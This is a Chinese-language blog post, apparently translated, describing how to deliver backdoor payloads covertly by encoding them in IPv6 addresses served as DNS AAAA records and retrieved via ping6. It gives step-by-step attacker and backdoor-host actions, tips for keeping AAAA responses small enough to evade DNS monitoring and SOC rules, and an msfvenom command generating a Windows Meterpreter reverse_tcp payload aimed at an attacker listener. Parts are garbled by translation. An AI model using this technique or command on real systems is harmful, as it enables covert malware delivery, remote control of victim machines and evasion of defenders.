通过 DNS AAAA 记录和 IPv6 地址传输 Backdoor Payloads

Stbird • 2017年2月24日 • Web安全 • 阅读 671

通过DNS AAAA记录和IPv6地址传输Backdoor Payloads

在本文中我想解释如何在DNS 流量中使用IPv6地址（AAAA）记录转移Payloads。

我们谈谈AAAA记录。

本文有2部分：

  • 第一部分：DNS AAAA记录和ICMPv6
  • 第二部分：DNS和AAAA记录（大型DNS AAAA记录响应）

第一部分：DNS AAAA记录和ICMPv6

IPv6地址想用于传输Payloads，如何要做到这一点很简单。

例如，我们有一个IPv6地址是这样的：

  • fe80：1111：0034：abcd：ef00：ab11：ccf1：0000

在这种情况下，我们可以使用IPv6地址的这些“xxxx”部分用于我们的Payloads。

  • fe80：1111：xxxx：xxxx：xxxx：xxxx：xxxx：wxyz

我认为有两种方式使用这个IPv6地址作为Payloads，首先可以使用DNS和AAAA记录，其次是使用这些IPv6地址       和DNS AAAA记录ICMPv6流量和Ping6。

ICMPv6和Ping6：在这种情况下， Attacker 可以用 IPv6地址假冒 IPv6地址与注入Payloads，然后从Backdoor     system，你可以通过Ping6环路（ICMPv6流量）获取这些IPv6地址，所以我们有这样的东西：

  • （Backdoor system）ipaddress = {192.168.1.120}
  • （attacker system）ipaddress = {192.168.1.111，fe80：1111：0034：abcd：ef00：ab11：ccf1：0000}
  • （attacker system）DNS name=test.domain.com , and DNS service Installed {dnsmasq or dnsspoof}

DNS AAAA记录和ICMPv6步骤：

  • 步骤1：（attacker DNS server）record0 => fe80：1111：0034：abcd：ef00：ab11：ccf1：0000 AAAA test.domain.com
  • 步骤2：（backdoor system）==> nslookup test.server.com 192.168.1.111
  • 步骤3：（Backdoor system）循环Ping6 =>（Attacker system fe80：1111：0034：abcd：ef00：ab11：ccf1：0000）
  • 步骤4：（Backdoor system）转储通过Ping6 响应在IPv6地址中注入的Payloads，转储这些部分{ 0034：abcd：ef00：ab11：ccf1 }
  • 步骤5：（attacker DNS server）record0更改为test.domain.com的新AAAA
  • 步骤6：（attacker DNS server）record0 => fe80：1111：cf89：abff：000e：09b1：33b1：0001 AAAA test.domain.com
  • 步骤6-1：（attacker system）通过ifconfig eth0 {NewIPv6地址：fe80：1111：cf89：abff：000e：09b1：33b1：0001 } 添加或更改NIC IPv6地址
  • 步骤6-2：ping6响应为步骤3 = 超时或不可达（错误），这个时间是获取新的IPv6地址的标志或者可能是你的流量由某事和被阻止。
  • 步骤7：（backdoor system）=> nslookup test.server.com 192.168.1.111
  • 步骤8：（backdoor system）循环Ping6 test.domain.com => {新IPv6地址fe80：1111：cf89：abff：000e：09b1：33b1：0001 }
  • 步骤9：（backdoor system）转储通过Ping6响应从新IPv6地址注入的Payloads，转储这些部分：{ cf89：abff：000e：09b1：33b1 }

注1：那我们可以知道IPv6地址改变了吗？当ping6响应从Attacker system超时或不可达时…也可以通过    Nslookup检查这个。

注2：也可以使用多个ipv6地址为Attacker NIC在这种情况下不需要步骤“6-1”。但在这个时候你不能使用“注1：”所以在这种情况下，你应该使用定时器或循环来从Attacker system获得新的ipv6地址通过nslookup 工具或backdoor system。通过Nslookup和DNS循环功能和分块IPv6 DNS名称Attacker system的线路IPv6地址。

在这些步骤后，你有20个字节Payloads由DNS和ICMPv6流量，如下：

  • payload0 = fe80：1111：0034：abcd：ef00：ab11：ccf1：0000 ==> 0034：abcd：ef00：ab11：ccf1
  • payload1 = fe80：1111：cf89：abff：000e：09b1：33b1：0001 ==> cf89：abff：000e：09b1：33b1

所以我们有这个Payloads后两个Ping6

  • response：0034abcdef00ab11ccf1cf89abff000e09b133b1

但在这种技术中，你只能通过DNS流量，这意味着你可以删除Ping6的所有步骤。因此，如果你想在没有Ping6和    ICMPv6流量的情况下执行此操作，你可以通过DNS响应仅在步骤2和步骤7中从DNS 服务器转储payloads。

当我们可以通过DNS请求获取Payloads时，为什么Ping？

如果你想有DNS请求，如DNS请求循环或DNS请求与响应通过AAAA记录，那么这是标记为检测通过DNS 监控工具，所以如果你有1或2 ping6 AAAA记录在每个DNS AAAA响应，我想它是正常的流量和风险在DNS监控设备或DNS监控工具中的可能性非常低。

例如，你可以使用一个请求与一个响应由1或2或3个AAAA记录。这意味着如果你的响应有4个AAAA记录或超过   4个AAAA记录然后网络监控设备/工具将检测你的流量，但SOC / NOC  Guys比我们能更好地限制规则在这些网络中。

正如你可以看到在图片A我的请求test.domain.com在响应中有8 AAAA记录。

所以在这种情况下，你应该在IPv6地址和DNS名称中分块你的Payloads。

让我解释一下关于ICMPv6，如果你想ping一个系统的IPV6地址，首先你应该得到IPv6地址的系统，所以你总是   需要DNS请求。重要点是需要多少DNS请求在IPv6地址倾倒所有IPv6地址也倾倒InjectedMeterpreter Payloads？

第二部分：DNS和AAAA记录（大型DNS AAAA记录响应）

在这里，我想谈谈DNS和AAAA记录，并谈论如何可以通过一个DNS请求和一个DNS响应从伪DNS服务器到backdoor system获得这些Payloads。所以我们谈论大型AAAA响应，这意味着在一个DNS响应后，你可以拥有backdoor system中的所有Payloads，你还有一个DNS AAAA响应的Meterpreter会话。

通过NativePaylaod_IP6DNS工具逐步传输带有DNS AAAA记录的backdoor Payloads：

步骤1：使用Hosts文件创建FakeDnsServer。

在这种情况下对于Attacker系统我想使用dnsmasq工具和dnsmasq.hosts文件。

在做这个文件之前你需要Payloads，所以使用这个命令你可以有一个Payloads。

  • Msfvenom-arch x86_64 -platform windows -pwindows / x64 / meterpreter / reverse_tcp lhost 192.168.1.50 -fc> /payload.txt

注意：在这种情况下192.168.1.50是Attacker FakednsServer和Attacker Metasploit侦听器
